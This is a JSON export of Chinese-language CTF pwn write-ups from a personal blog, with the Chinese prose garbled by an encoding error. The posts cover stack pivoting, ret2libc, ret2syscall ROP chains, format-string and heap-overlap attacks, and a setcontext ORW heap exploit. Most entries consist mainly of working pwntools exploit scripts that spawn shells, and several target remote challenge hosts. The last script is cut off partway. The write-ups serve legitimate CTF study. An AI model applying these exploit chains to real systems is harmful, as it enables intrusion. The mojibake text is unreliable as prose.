SIZE_SZï¼ŒSIZE_SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC_ALIGN_MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC_ALIGN_MASKäº†MALLOC_ALIGN é€šå¸¸æŒ‡çš„æ˜¯å†…å­˜å—å¯¹é½çš„è¦æ±‚ã€‚å¦‚æœreqä¸å¯¹é½ï¼Œä¸æ˜¯0x0ç»“å°¾çš„ï¼Œéœ€è¦å¤šå‡æ‰8 bcloud_bctf_2016åªå¼€äº†æ ˆä¸Šçš„ä¿æŠ¤ è¿™é‡Œä¼šæŠŠå †çš„åœ°å€ç»™åˆ°v2çš„æŒ‡é’ˆï¼Œåç»­ä¼šæ‰“å°å‡ºæ¥ ğŸ•â…§é¢˜ç›®ï¼Œè°ƒè¯•çš„æ—¶å€™å®Œå…¨ä¸æ˜¯é¢˜ç›®é€»è¾‘ï¼Œç®—äº†ã€‚","categories":[],"tags":[]},{"title":"","slug":"pwn2 short","date":"2024-10-29T09:09:11.391Z","updated":"2024-10-29T09:09:11.572Z","comments":true,"path":"2024/10/29/pwn2 short/","link":"","permalink":"http://example.com/2024/10/29/pwn2%20short/","excerpt":"","text":"pwn2 shortå¾ˆç®€å•çš„32ä½æ ˆè¿ç§»ï¼Œè¿˜ç•™äº†ä¸ªåé—¨ è¿™é‡Œè·å¾—æ ˆåœ°å€ æŠŠbin/shçš„åœ°å€æ”¾è¿”å›åœ°å€åé¢å°±ok from pwn import* from LibcSearcher import * p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744) #p=process(&quot;./short&quot;) context.log_level=&quot;debug&quot; p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;) p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;) p.recvuntil(&#39;0x&#39;) stack=int(p.recv(8),16) print(hex(stack)) pop_edi=0x0804884a pop_ebx=0x08048411 gift=0x080485E6 leave=0x08048674 binsh=0x0804A038 payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave) #gdb.attach(p) sleep(1) p.sendlineafter(&quot;msg:&quot;,payload) p.interactive()","categories":[],"tags":[]},{"title":"overlapping_chunks","slug":"overlapping_chunks","date":"2024-10-21T12:11:58.000Z","updated":"2024-10-21T14:20:21.671Z","comments":true,"path":"2024/10/21/overlapping_chunks/","link":"","permalink":"http://example.com/2024/10/21/overlapping_chunks/","excerpt":"","text":"å¤§å¤šéƒ½æ˜¯å †æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œchunké‡Šæ”¾å‰æˆ–é‡Šæ”¾åæ”¹å˜sizeçš„å€¼ï¼Œå†ç”³è¯·çš„æ—¶å€™é€ æˆä¸¤ä¸ªå †å—æœ‰é‡åˆçš„åœ°æ–¹ï¼Œæœ‰æ—¶å€™éœ€è¦æ”¹å˜å¯¹åº”ä¸‹ä¸€ä¸ªå †çš„pre_sizeç»•è¿‡æ£€æŸ¥ï¼Œè™½è¯´åœ¨libc2.29ä»¥åæ‰å‡ºç°ï¼Œä½†æœ‰æ—¶å€™2.23çš„ç‰ˆæœ¬è¿˜æ˜¯ä¼šå› æ­¤è€ŒæŠ¥é”™ã€‚æ‰€ä»¥å°½å¯èƒ½çš„åœ¨ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½æ”¹æˆæˆ‘ä»¬çš„size. /* consolidate backward */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;); unlink_chunk (av, p); &#125; 2015 hacklu bookstoreè¯¥ç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥çš„ 64 ä½ç¨‹åºï¼Œä¸»è¦å¼€å¯äº† Canary ä¸ NX ä¿æŠ¤. ç¨‹åºçš„æœ€åæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨äºæ³„éœ²libcå’Œåœ¨finiçš„åœ°æ–¹å†™ä¸Šmainå‡½æ•°åœ°å€ è¿™é‡Œè¾“å…¥sæ˜¯èƒ½å†™ä¸Šæ ˆçš„åœ°æ–¹ï¼Œè¿™é‡Œè¾“å…¥finiçš„åœ°å€ ç®—å‡ºåç§»æ˜¯13 è¿™é‡Œåªå¼ºè°ƒæ„é€ çš„fake_chunk payload=b&#39;%2828c%13$hnkk%31$p&#39; payload=payload.ljust(0x88,b&#39;b&#39;) payload+=p64(0x151) payload=payload.ljust(0x1d0,b&#39;\\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31) ç”³è¯·å †çš„è¿‡ç¨‹ä¸­æœ‰å †æº¢å‡ºå¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ª å †çš„sizeï¼Œæ”¹æˆä¸‹é¢ç‰¹æ®Šçš„å †çš„sizeï¼Œæ ¹æ®é¢˜ç›®ç»™å¤§å°æ”¹ã€‚","categories":[],"tags":[]},{"title":"heapcreator","slug":"heapcreator","date":"2024-10-17T08:03:43.000Z","updated":"2024-10-17T08:03:43.032Z","comments":true,"path":"2024/10/17/heapcreator/","link":"","permalink":"http://example.com/2024/10/17/heapcreator/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"stdout","slug":"stdout","date":"2024-09-21T14:44:34.000Z","updated":"2024-09-22T13:51:20.983Z","comments":true,"path":"2024/09/21/stdout/","link":"","permalink":"http://example.com/2024/09/21/stdout/","excerpt":"","text":"è¿™é‡Œstdoutç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0ï¼Œå°±æ˜¯æ ‡å‡†è¾“å‡ºå…¨ç¼“å†²ï¼Œç¼“å†²åŒºè¢«å¡«æ»¡æ‰èƒ½è¿›è¡Œå›æ˜¾ åˆ·æ–°ç¼“å†²åŒºæœ‰å‡ ç§åŠæ³• èƒ½å¤Ÿæº¢å‡º8å­—èŠ‚ ä¸€ä¸ªæ²¡ä»€ä¹ˆç”¨çš„å‡½æ•° é‚£ä¹ˆåªèƒ½å°†ç¼“å†²åŒºå¡«æ»¡ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯ç”¨vulnå‡½æ•°ä¸æ–­è¾“å…¥ retçš„æ“ä½œæ˜¯pop ripï¼Œrsp=rsp+8, æŒ‡å‘0x0x7fff153a5588. endbr64æŒ‡ä»¤rspæ˜¯ä¸åŠ¨çš„ï¼Œpush rbpårbpå˜æˆäº†åŸæ¥è¿”å›åœ°å€çš„ä½ç½®,å†æ¬¡è°ƒç”¨ç›¸åŒçš„è¾“å…¥ä¹Ÿåªæ˜¯è®©rbp+8,å³æ¯æ¬¡ for i in range(20): payload=b&#39;c&#39;*0x28+p64(vul) p.send(payload) print(i) ä¹Ÿåªæ˜¯è®©rbp+8ç§»åŠ¨ ç¬¬äºŒæ¬¡çš„rbp åªæ˜¯è°ƒç”¨vulnçš„è¯æ—¶ä¸ä¼šå›æ˜¾çš„ã€‚ å…¶å®ä¸æ˜¯ç†æƒ³å½“ç„¶çš„å¡«å……ï¼Œå¾—è°ƒç”¨extendå‡½æ•°å¡«å……ç¼“å†²åŒºã€‚é‚£ä¹ˆå°±åªèƒ½ä¸æ–­è°ƒç”¨extendå‡½æ•°æŠŠç¼“å†²åŒºå¡«æ»¡ã€‚ è°ƒç”¨extendæ—¶ç¬¬äºŒåæ¬¡æ—¶çš„æ ˆ exp from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./pwn&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./pwn&#39;) libc=ELF(&#39;./libc-2.31.so&#39;) extend=0x401287 vul=0x40125D pop_rdi=0x4013d3 puts_got=elf.got[&#39;puts&#39;] puts=elf.plt[&#39;puts&#39;] payload=b&#39;a&#39;*0x58+p64(vul) p.send(payload) payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul) p.send(payload) for i in range(21): payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul) p.send(payload) p.recvuntil(&#39;stdout???&#39;) p.recvline() puts_addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) gdb.attach(p) pause() payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system) p.send(payload) print(hex(libc.sym[&#39;puts&#39;])) print(&#39;put&#39;+hex(puts_addr)) p.interactive()","categories":[],"tags":[]},{"title":"è§£å†³libc6è½¯ä»¶åŒ…å’Œlibc6-devä¸åŒ¹é…çš„é—®é¢˜","slug":"è§£å†³libc6è½¯ä»¶åŒ…å’Œlibc6-devä¸åŒ¹é…çš„é—®é¢˜","date":"2024-09-18T12:27:44.000Z","updated":"2024-09-19T13:03:57.427Z","comments":true,"path":"2024/09/18/è§£å†³libc6è½¯ä»¶åŒ…å’Œlibc6-devä¸åŒ¹é…çš„é—®é¢˜/","link":"","permalink":"http://example.com/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"ä¹‹å‰åœ¨å­¦vmå†…æ ¸è°ƒè¯•çš„æ—¶å€™ï¼Œä¸å°å¿ƒæŠŠlibc6-devä¹‹ç±»çš„åŒ…ç»™åˆ æ‰äº†ï¼Œå¯¼è‡´åé¢gccç¼–è¯‘ä¸äº†ï¼Œé‡æ–°ä¸‹è½½libc6-devæ—¶ï¼Œä¼šå¼¹å‡ºè¿™æ ·çš„æŠ¥é”™ï¼Œè¿™ç§æŠ¥é”™ä¹‹å‰å¾ˆå¸¸è§ã€‚ ä¸‹åˆ—è½¯ä»¶åŒ…æœ‰æœªæ»¡è¶³çš„ä¾èµ–å…³ç³»ï¼š libc6-dev : ä¾èµ–: libc6 (= 2.27-3ubuntu1.6) ä½†æ˜¯ 2.35-0ubuntu3 æ­£è¦è¢«å®‰è£… ä¾èµ–: libc-dev-bin (= 2.27-3ubuntu1.6) E: æ— æ³•ä¿®æ­£é”™è¯¯ï¼Œå› ä¸ºæ‚¨è¦æ±‚æŸäº›è½¯ä»¶åŒ…ä¿æŒç°çŠ¶ï¼Œå°±æ˜¯å®ƒä»¬ç ´åäº†è½¯ä»¶åŒ…é—´çš„ä¾èµ–å…³ç³»ã€‚ æœ€æœ¬è´¨çš„åŸå› å°±æ˜¯å·²å®‰è£…çš„libc6ç‰ˆæœ¬æ˜¯2.35-0ubuntu3ï¼Œä½†æ˜¯è¦å®‰è£…çš„libc6-devæ‰€è¦çš„ä¾èµ–æ˜¯libc6å’Œlibc-dev-binçš„ç‰ˆæœ¬éƒ½æ˜¯2.27,å½“åˆæƒ³è¿‡æŠŠlibc6é™çº§çš„ï¼Œå› ä¸ºlibc6æ˜¯è½¯ä»¶åŒ…ï¼Œæœ‰å¾ˆå¤šä¾èµ–å…³ç³»ï¼Œç»“æœç³»ç»Ÿå¥”æºƒäº†ï¼Œè¿˜åˆšå¥½æ²¡æå‰æ‹å¿«ç…§ï¼Œåªæœ‰å¾ˆä¹…ä¹‹å‰çš„ã€‚ libc6å°±æ˜¯ä¸€ä¸ªè½¯ä»¶åŒ…åç§°ï¼ŒåŒ…å«cæ ‡å‡†åº“çš„æ‰€æœ‰åŠŸèƒ½ï¼ŒåŒ…å«æœ‰å¾ˆå¤šåº“æ–‡ä»¶ï¼Œå¦‚libc.so.6ï¼Œæ˜¯åº•å±‚ä»£ç å¦‚prinfå‡½æ•°çš„å®ç°ã€‚é€šå¸¸å­˜æ”¾åœ¨/libç›®å½•ä¸‹ï¼Œç³»ç»Ÿæ ¸å¿ƒåº“çš„å­˜æ”¾ç›®å½•ã€‚ libc6-devå«æœ‰å¾ˆå¤šcæ ‡å‡†åº“ï¼Œå¦‚stdio.h,math.h.åŒ…å«å¾ˆå¤šå¤´æ–‡ä»¶ã€‚è§£å‹æ”¾åˆ°/usr/include/ã€‚ /usr/lib ç›®å½•æ˜¯ç”¨æˆ·çº§åº“çš„å­˜æ”¾ç›®å½•ï¼Œè¿™äº›åº“æ–‡ä»¶æ˜¯ç”¨æˆ·å®‰è£…çš„è½¯ä»¶åŒ…æ‰€éœ€çš„ï¼Œä¾‹å¦‚å›¾å½¢åº“ã€æ•°æ®åº“åº“ã€å¼€å‘åº“ç­‰ã€‚è¿™äº›åº“æ–‡ä»¶é€šå¸¸æ˜¯ç”¨æˆ·å®‰è£…çš„è½¯ä»¶åŒ…æ‰€éœ€çš„ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿæ ¸å¿ƒç»„ä»¶æ‰€éœ€çš„ã€‚ æœ€æ­£ç¡®çš„åŠæ³•å°±æ˜¯ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„libc6-dev.debè§£å‹ï¼Œè¦å’Œå·²å®‰è£…çš„libc6ç‰ˆæœ¬åŒ¹é…ï¼Œå½“æ—¶æ˜¯ç›´æ¥æ‰¾äº†ç½‘ç«™glibcåº“ ä¸‹è½½libc6-dev.debï¼Œä½†æ˜¯æ‰¾ä¸åˆ°2.35ç‰ˆæœ¬çš„ï¼Œåé¢ç»ˆäºåœ¨package.ubuntu.comæ‰¾åˆ°,ç‚¹è¿™ä¸¤ä¸ªä¸‹è½½ https://packages.ubuntu.com/jammy/libc6-dev è§£å‹åˆ°/tmp/libc6-dev mkdir /tmp/libc6-dev dpkg-deb -x libc6-dev_2.35-0ubuntu3.8_amd64.deb /tmp/libc6-dev sudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/ #ç§»åŠ¨å¤´æ–‡ä»¶ sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/ #ç§»åŠ¨å…±äº«æ•°æ®æ–‡ä»¶ sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/ #ç§»åŠ¨ç”¨æˆ·çº§åº“æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°ç‚¹ã€‚ åŒç†ï¼Œlibc-dev-binä¹Ÿè§£å‹ mkdir /tmp/libc-dev-bin dpkg-deb -x libc-dev-bin_2.35-0ubuntu3.8_amd64.deb /tmp/libc-dev-bin sudo rsync -av /tmp/libc-dev-bin/usr/ /usr/ #ä¸»è¦æ˜¯ä¸€äº›å·¥å…·è„šæœ¬ åé¢æŠŠtmpç›®å½•ä¸‹çš„è¿™ä¸¤ä¸ªä¸´æ—¶æ–‡ä»¶åˆ äº†å°±å¥½ã€‚ åé¢æˆ‘è¯•ç€gccç¼–è¯‘çš„æ—¶å€™ï¼Œè¿˜æ˜¯é‡è§äº†ä¸ªè€é”™è¯¯ gcc 1.c -o 1 /usr/bin/ld: æ‰¾ä¸åˆ° Scrt1.o: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• /usr/bin/ld: æ‰¾ä¸åˆ° crti.o: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• collect2: error: ld returned 1 exit status é€šè¿‡æŸ¥æ‰¾å‘ç°ï¼Œå®ƒåœ¨/tmp/libc6-dev/usr/lib/x86_64-linux-gnu è¿™ä¸ªç›®å½•é‡Œï¼Œè¿™ä¸ªæ­£æ˜¯åº“æ–‡ä»¶çš„ä½ç½®ï¼ŒæŠŠè¿™äº›åº“æ–‡ä»¶ç§»åŠ¨åˆ°/usr/lib/x86_64-linux-gnu/ç›®å½•å°±å¥½ æœ€åï¼Œç¼–è¯‘æˆåŠŸ","categories":[],"tags":[]},{"title":"glibc","slug":"glibc","date":"2024-09-13T09:02:48.000Z","updated":"2024-11-03T13:08:43.068Z","comments":true,"path":"2024/09/13/glibc/","link":"","permalink":"http://example.com/2024/09/13/glibc/","excerpt":"","text":"æ‰‹åŠ¨ä¸‹è½½glibcç‰ˆæœ¬ æœ‰æ—¶å€™åšé¢˜ä¼šé‡åˆ°glibc-all-in-oneé‡Œæ²¡æœ‰çš„glibc,éœ€è¦è‡ªå·±ä¸‹ å¯ä»¥åˆ°ç½‘ç«™æ‰‹åŠ¨ä¸‹è½½å¯¹åº”çš„./debæ–‡ä»¶ http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/ åœ¨glibc-all-in-oneç›®å½•ä¸‹ï¼Œè‹¥glibcç‰ˆæœ¬åä¸ºx,ç”¨æŒ‡ä»¤è§£å‹ ./extract ./x.deb ./libs/x","categories":[],"tags":[]},{"title":"gostack","slug":"gostack","date":"2024-09-12T11:31:39.000Z","updated":"2024-09-13T12:15:12.764Z","comments":true,"path":"2024/09/12/gostack/","link":"","permalink":"http://example.com/2024/09/12/gostack/","excerpt":"","text":"i ä¸€ä¸ªç”¨goè¯­è¨€å†™çš„ç¨‹åºã€‚ alt+f7ç”¨go_parserä¿®å¤ä¸€ä¸‹ ä¸»è¦çš„å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œå› ä¸ºæ˜¯goè¯­è¨€å†™çš„ï¼Œå…¶åæ±‡ç¼–ä¹Ÿæ˜¯å¾ˆéš¾çœ‹æ‡‚ ä¸»è¦çœ‹æ±‡ç¼–,å®ƒåé¢ä¼šå°†è¾“å…¥çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ ˆä¸Š åœ¨scannerè¾“å…¥è¿™é‡Œä¼šæ£€æŸ¥è¿™ä¸ªä½ç½®çš„å€¼æ˜¯å¦ä¸º0 ä¸ºäº†æ–¹ä¾¿å…¨éƒ½ç”¨0å¡«å…… è„šæœ¬çš„å…·ä½“è°ƒè¯•æ˜¯æŠ¥é”™çš„ï¼Œçœ‹ä¸äº†ï¼Œä¹Ÿåªèƒ½åˆ†æä¸ªå¤§æ¦‚ã€‚ ç›´æ¥gdb ç®—å‡ºè·ç¦»rbpæ˜¯0x1c8çš„è·ç¦»ã€‚ è¿™ç§é¢˜ä¸€èˆ¬æ˜¯ç”¨ret2syscallã€‚è€Œå¾€å¹´çš„å›½èµ›é¢˜ä¹Ÿæ˜¯ret2syscallå±…å¤šã€‚ æ‰¾åˆ°çš„gadget syscall;retæ˜¯å¾ˆéš¾æ‰¾åˆ°çš„ã€‚é€šè¿‡gadgetæ‰¾ä¸åˆ°ã€‚ å…ˆsys_readåœ¨bssæ®µè¾“å…¥bin/sh,å†sys_execve. #bss read payload=b&#39;\\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6 payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret) #execve payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret) åŒæ—¶ä¹Ÿé¡ºå¸¦å¤ä¹ ä¸€ä¸‹ï¼Œsys_readçš„å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œrax=0,rdi=0,rsi=bss,rdx=size.sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.å‰é¢æŒ‰ç…§è„šæœ¬ä¸€æ ·å†™ä¸€ç›´è·‘ä¸é€šï¼Œåé¢çªç„¶å°±è·‘é€šäº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹ç¦»è°±ã€‚from pwn import* from LibcSearcher import * p=remote(&quot;pwn.challenge.ctf.show&quot;,28159) #p=process(&quot;./gostack&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;,os=&#39;linux&#39;) #payload=b&#39;a&#39;*0x1d0+p64(0x4A0af6) pop_rdi_r14=0x4a18a5 pop_rax=0x40f984 bss=0x5655C2 pop_rsi=0x42138a pop_rdx=0x4944ec syscall_ret=0x4616C9 #gdb.attach(p) #pause() #bss read payload=b&#39;\\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6 payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret) #exceve payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret) #p.recv() p.sendlineafter(&#39;magic message :&#39;,payload) p.sendline(b&#39;/bin/sh\\x00&#39;) p.interactive()","categories":[],"tags":[]},{"title":"pstack","slug":"pstack","date":"2024-09-08T08:40:58.000Z","updated":"2024-09-08T08:40:58.239Z","comments":true,"path":"2024/09/08/pstack/","link":"","permalink":"http://example.com/2024/09/08/pstack/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"æ­¦åŠŸè®ºå‰‘","slug":"æ­¦åŠŸè®ºå‰‘","date":"2024-07-27T05:23:02.000Z","updated":"2024-07-27T06:22:30.638Z","comments":true,"path":"2024/07/27/æ­¦åŠŸè®ºå‰‘/","link":"","permalink":"http://example.com/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/","excerpt":"","text":"ä¸€é“å¾ˆç®€å•çš„apké¢˜ï¼Œåæ±‡ç¼–å‡ºæ¥ï¼Œå°†ä¸¤ä¸ªæ•°ç»„çš„å€¼ä¸€ä¸€å¼‚æˆ–å°±å¾—åˆ°flag è¿™é“ç®€å•çš„æ ˆæº¢å‡ºé¢˜ï¼Œå¼€äº†canaryä¿æŠ¤ è¿™é‡Œè¾“å…¥0x49ä¸ªå­—èŠ‚å¯ä»¥å°†canaryå’Œrbpæ‰“å°å‡ºæ¥ ä¸»å‡½æ•°æœ‰ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œè¿™é‡Œret2libcæ³„éœ²putsçš„gotè¡¨åœ°å€ï¼Œå†è¿”å›é‡æ–°è¾“å…¥ä¸€æ¬¡ from pwn import* from LibcSearcher import * #p=remote(&quot;59.62.61.30&quot;,46489) p=process(&quot;./pwn&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) pop_rdi=0x400853 puts_got=0x601018 call_puts=0x4007af payload=b&#39;a&#39;*0x48+b&#39;b&#39; puts_plt=0x400580 #pause() p.send(payload) p.recvuntil(&#39;b&#39;) canary=u64(p.recv(7).rjust(8,b&#39;\\x00&#39;)) rbp_addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) print(hex(canary)) print(&#39;rbp&#39;+hex(rbp_addr)) payload=b&#39;b&#39;*0x48+p64(canary)+p64(rbp_addr-0x50) payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts) gdb.attach(p) sleep(1) pause() p.sendlineafter(&#39;overflow!&#39;,payload) p.recvline() puts=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=puts-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) print(&#39;puts&#39;+hex(puts)) one=[0x4f3d5,0x4f432,0x10a41c] one_gadget=base+one[0] # p.recvline() payload=b&#39;a&#39;*0x48+p64(canary)+b&#39;a&#39;*8+p64(one_gadget) #+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_pwn","slug":"ciscn-pwn","date":"2024-05-19T08:17:29.000Z","updated":"2024-05-20T15:09:28.133Z","comments":true,"path":"2024/05/19/ciscn-pwn/","link":"","permalink":"http://example.com/2024/05/19/ciscn-pwn/","excerpt":"","text":"ç¬¬ä¸€å¤©_gostack64ä½çš„é™æ€ç¼–è¯‘é¢˜ å¾ˆæ˜æ˜¾çš„syscallå’Œå¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„gadget åˆ©ç”¨syscallå‘bssæ®µå†™å…¥ bin/shï¼Œå†syscallæ‰§è¡Œexecve(â€˜bin/shâ€™,0,0),æ‹¿åˆ°flag from pwn import* from LibcSearcher import * p=remote(&quot;8.147.134.47&quot;,16589) #p=process(&quot;./gostack&quot;) elf=ELF(&#39;./gostack&#39;) context.log_level=&quot;debug&quot; # Gadgets and syscall addresses syscall_address = 0x404043 rax_ret_address = 0x40f984 rdi_6_ret_address = 0x4a18a5 rsi_ret_address = 0x42138a rdx_ret_address = 0x4944ec # Create the payload payload = b&#39;a&#39; * 0x100 payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18 payload += p64(rdi_6_ret_address) + p64(0) * 6 payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200) payload += p64(rdx_ret_address) + p64(0x100) payload += p64(rax_ret_address) + p64(0) payload += p64(syscall_address) payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rsi_ret_address) + p64(0) payload += p64(rdx_ret_address) + p64(0) payload += p64(rax_ret_address) + p64(0x3b) payload += p64(syscall_address) # Send the payload p.sendlineafter(&#39;message :\\n&#39;, payload) input() p.sendline(&#39;/bin/sh\\x00&#39;) p.interactive() EzHeap editå‡½æ•°å­˜åœ¨å †æº¢å‡º å¼€å¯äº†æ²™ç®±ä¿æŠ¤,è¿™æ˜¯ä¸€é“å †çš„orwã€‚ æ³„éœ²å‡ºå †çš„åŸºåœ°å€add_chunk(0x28) add_chunk(0x28) # Edit and leak heap address edit_chunk(0, 0x50, b&#39;a&#39; * 0x50) show_chunk(0) io.recvuntil(b&#39;a&#39; * 0x50) gdb.attach(io) pause() heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\\x00&#39;)) heap_base = heap_leak &lt;&lt; 12 å°†free_hookæ”¹æˆsetcontext,é€šè¿‡setcontextæ§åˆ¶rspè¿›è€Œorw,æ„é€ ropæœ€åè·å¾—flagfrom pwn import * elf = ELF(&quot;./EzHeap&quot;) context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io=process(&#39;EzHeap&#39;) #io = remote(&#39;8.147.129.121&#39;, 26987) def add_chunk(size, content=b&#39;&#39;): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;) io.sendlineafter(&quot;size:&quot;, str(int(size))) io.sendafter(&quot;content:&quot;, content) def delete_chunk(index): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) def edit_chunk(index, size, content): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) io.sendlineafter(&quot;size:&quot;, str(size)) io.sendafter(&quot;content:&quot;, content) def show_chunk(index): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) def exit_program(): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;) # Add initial chunks add_chunk(0x28) add_chunk(0x28) # Edit and leak heap address edit_chunk(0, 0x50, b&#39;a&#39; * 0x50) show_chunk(0) io.recvuntil(b&#39;a&#39; * 0x50) gdb.attach(io) pause() heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\\x00&#39;)) heap_base = heap_leak &lt;&lt; 12 # Edit chunk to set up fake chunk edit_chunk(0, 0x50, b&#39;\\x00&#39; * 0x28 + p64(0x21) + b&#39;\\x00&#39; * 0x18 + p64(0xd1)) # Leak libc address edit_chunk(1, 0x30, b&#39;a&#39; * 0x30) show_chunk(1) io.recvuntil(b&#39;a&#39; * 0x30) libc_leak = u64(io.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) libc_base = libc_leak - 0x21ace0 # Edit chunk to consolidate chunks edit_chunk(1, 0x30, b&#39;\\x00&#39; * 0x28 + p64(0xf1)) # Set up libc addresses setcontext_address = libc_base + 0x539e0 + 61 read_address = libc_base + 0x1147d0 write_address = libc_base + 0x114870 rtld_global_address = libc_base + 0x285040 rtld_3_address = libc_base + 0x2865a0 pop_rdi = libc_base + 0x2a3e5 pop_rsi = libc_base + 0xe7d0d pop_rdx = libc_base + 0x11f2e7 # r12 ret = libc_base + 0x1193c1 pop_rax = libc_base + 0x45eb0 syscall = libc_base + 0x91316 target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address # Add chunks to manipulate heap add_chunk(0x78) # Chunk 2 add_chunk(0x78) # Chunk 3 add_chunk(0x78) # Chunk 4 add_chunk(0x78) # Chunk 5 edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address)) add_chunk(0x18) # Chunk 6 add_chunk(0x18) # Chunk 7 add_chunk(0x18) # Chunk 8 add_chunk(0x18) # Chunk 9 add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address)) heap_leak_adjusted = heap_base - 0x650 l_next_address = 